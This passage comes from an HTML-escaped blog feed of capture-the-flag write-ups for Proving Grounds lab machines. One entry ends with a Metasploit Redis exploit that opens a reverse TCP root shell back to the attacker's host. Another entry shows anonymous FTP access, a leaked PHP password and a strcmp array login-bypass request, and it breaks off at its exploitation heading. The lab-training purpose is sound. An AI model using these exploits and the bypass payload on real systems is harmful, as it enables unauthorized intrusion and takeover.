&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGBXRhQCez7/IOdnHzLYdpVtWWRMN/7bUR/C3T/W6V9DwlKUS2AfdncLdLwqnx61jODFdXDrTdEdTAtK4MHuXt/UOLDXr1SOfUHYQbZd1rmpMaeB3qOKfoVP7NMp2Ga68kT/9NvBphakYXRWw4C7RS0N+4YWU/BjSyMTIdnhJX05lC5Uyljg7FliJ7d3J/CtF98I6Oo5u/Eb2/5BB45/1IuM6R7BGCDOpIs6po1FyEk8gFktbB+INGATdBPxvmAOX6G7m/R491a9/QtaF8wrgsjS3fQftoiW8vwcaom8Bmu94xZ9pZq0Dgt9VWQz241T5dGQrp57s6Djl/V83/qGFP
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLg0oQ1t4NCz+KWPtrCjgDf+qjW2Vb4oOc/eM21vT9rIPJa//rO0LFT8czDxcWFU9HMSEohfSm8emC4lShgGrY4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
|   256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPS81xs7EU6k92rNFdmsDF7qcRDxDILJUeva18aKW1GV
80/tcp    open  http       syn-ack ttl 63 nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to nginx!
6379/tcp  open  redis      syn-ack ttl 63 Redis key-value store 5.0.9
8080/tcp  open  http-proxy syn-ack ttl 63
27017/tcp open  mongod?    syn-ack ttl 63
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;There are a few open services. Thoroughly enumerating all services, we are particularly interested in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redis&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;redis-rce&quot;&gt;&lt;strong&gt;Redis RCE&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Conducting a few investigations, we discover that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Redis v5.0.9&lt;/code&gt; is vulnerable to &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Unauthenticated Remote Code Execution&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit redis
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                                                                   |  Path
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
...
Redis 4.x / 5.x - Unauthenticated Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                    | linux/remote/47195.rb
...
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Metasploit&lt;/code&gt; console, we adjust configurations as the following.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux/redis/redis_replication_cmd_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/linux/redis/redis_replication_cmd_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name      Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   CUSTOM    &lt;span class=&quot;nb&quot;&gt;true             yes       &lt;/span&gt;Whether compile payload file during exploiting
   PASSWORD  foobared         no        Redis password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;authentication &lt;span class=&quot;nb&quot;&gt;test
   &lt;/span&gt;RHOSTS    192.168.106.69   &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     6379             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   SRVHOST   192.168.49.106   &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;host or network interface to listen on. This must be an address on the &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   6379             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;port to listen on.


Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux/x64/shell/reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   LHOST  192.168.49.106   &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LPORT  8080             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen port


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Automatic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;then enter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux/redis/redis_replication_cmd_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 192.168.49.106:8080 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 192.168.106.69:6379   - Compile redis module extension file
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 192.168.106.69:6379   - Payload generated successfully! 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 192.168.106.69:6379   - Listening on 192.168.49.106:6379
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 192.168.106.69:6379   - Rogue server close...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 192.168.106.69:6379   - Sending &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to trigger payload.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;38 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 192.168.106.69
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Command shell session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.49.106:8080 -&amp;gt; 192.168.106.69:35962&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-05 11:43:12 +1000
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; 192.168.106.69:6379   - This exploit may require manual cleanup of &lt;span class=&quot;s1&quot;&gt;&apos;./ahltczis.so&apos;&lt;/span&gt; on the target

root@wombo:/# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Further privilege escalation phase is trivial since we’re already &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; on the system!.&lt;/p&gt;</content><author><name></name></author><category term="pg" /><category term="linux" /><category term="ctf" /><summary type="html">Summary In this writeup, we’ll exploit the vulnerable Redis service to compromise root access on the target system.</summary></entry><entry><title type="html">Potato - OSPG</title><link href="https://jayngng.github.io/blog/potato-ospg/" rel="alternate" type="text/html" title="Potato - OSPG" /><published>2021-09-04T19:48:08+10:00</published><updated>2021-09-04T19:48:08+10:00</updated><id>https://jayngng.github.io/blog/potato---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/potato-ospg/">&lt;h1 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;We’ll exploit the weakness in PHP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; employed in a login prompt of an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; page. After bypass the login, we can secure the initial access via the &lt;strong&gt;Command Injection&lt;/strong&gt; vulnerability of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;page&lt;/code&gt; parameter. Privilege escalation can be procured with a misconfigured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll beign with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
2112/tcp open  ftp     syn-ack ttl 63 ProFTPD
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are three available services in total - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;. Let’s us observe some of them.&lt;/p&gt;

&lt;h4 id=&quot;ftp2112&quot;&gt;&lt;strong&gt;FTP/2112&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;To drop a FTP interactive shell, we utilize &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt; with the credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous:anonymous&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp 192.168.62.101 2112
Connected to 192.168.62.101.
220 ProFTPD Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;::ffff:192.168.62.101]
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.62.101:root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
331 Anonymous login ok, send your &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;email address as your password
Password:
...
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful
150 Opening ASCII mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;file list
drwxr-xr-x   2 ftp      ftp          4096 Aug  2  2020 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x   2 ftp      ftp          4096 Aug  2  2020 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 ftp      ftp           901 Aug  2  2020 index.php.bak
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 ftp      ftp            54 Aug  2  2020 welcome.msg
226 Transfer &lt;span class=&quot;nb&quot;&gt;complete&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; FTP shell, there are two accessible files: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php.bak&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;welcome.msg&lt;/code&gt;. Let’s us download and further investigate them.&lt;/p&gt;

&lt;p&gt;To download those files, we continue executing.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;226 Transfer &lt;span class=&quot;nb&quot;&gt;complete&lt;/span&gt;
...
ftp&amp;gt; mget &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
mget welcome.msg? y
...
mget index.php.bak? y
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php.bak&lt;/code&gt; yields the source code of a web application.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
&amp;lt;?php

&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;potato&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; //note Change this password regularly

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;login&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;username&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 0  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Welcome! &amp;lt;/br&amp;gt; Go to the &amp;lt;a href=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dashboard.php&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;dashboard&amp;lt;/a&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    setcookie&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;pass&apos;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; + 365&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;24&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;3600&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;p&amp;gt;Bad login/password! &amp;lt;/br&amp;gt; Return to the &amp;lt;a href=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;index.php&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;login page&amp;lt;/a&amp;gt; &amp;lt;p&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
?&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After conducting few researches, we discover that the PHP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; method &lt;strong&gt;is NOT secure&lt;/strong&gt; due to its nature. Let’s keep that in mind and move on to enumerating the web application on port 80.&lt;/p&gt;

&lt;h4 id=&quot;http80&quot;&gt;&lt;strong&gt;HTTP/80&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Employ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;, we expose a couple directories.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; common.txt
...
admin                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 318, Words: 20, Lines: 10]
index.php               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 245, Words: 31, Lines: 9]
server-status           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 403, Size: 280, Words: 20, Lines: 10]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin&lt;/code&gt; directory is our top concentration. Navigate to the site, we’re asked to login.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.62.101/admin/index.php | html2text
&lt;span class=&quot;k&quot;&gt;******&lt;/span&gt; Login &lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;
User: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username            &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;  Password: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;********************&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Login]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;insecure-strcmp&quot;&gt;&lt;strong&gt;Insecure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Let’s us recall the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; method in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php.bak&lt;/code&gt; file that we found ealier.&lt;/p&gt;

&lt;p&gt;Primarily, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; is bypassible by supplying a &lt;strong&gt;NULL array&lt;/strong&gt;. In other words, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; with a &lt;strong&gt;NULL array&lt;/strong&gt; will return &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL == 0&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;. For that reason, without a valid credentials, we can still manage to bypass the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; login prompt.&lt;/p&gt;

&lt;p&gt;To describe the idea, we intercept the login request with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burpsuite&lt;/code&gt;, then adjust the payload as following:&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /admin/index.php?login=1 HTTP/1.1
Host: 192.168.62.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,&lt;span class=&quot;ge&quot;&gt;*/*&lt;/span&gt;;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://192.168.62.101
Connection: close
Referer: http://192.168.62.101/admin/
Upgrade-Insecure-Requests: 1

username[]=%22%22&amp;amp;password[]=%22%22
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we continue &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Forward&lt;/code&gt;ing the traffic, and successfully land on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admin area&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;
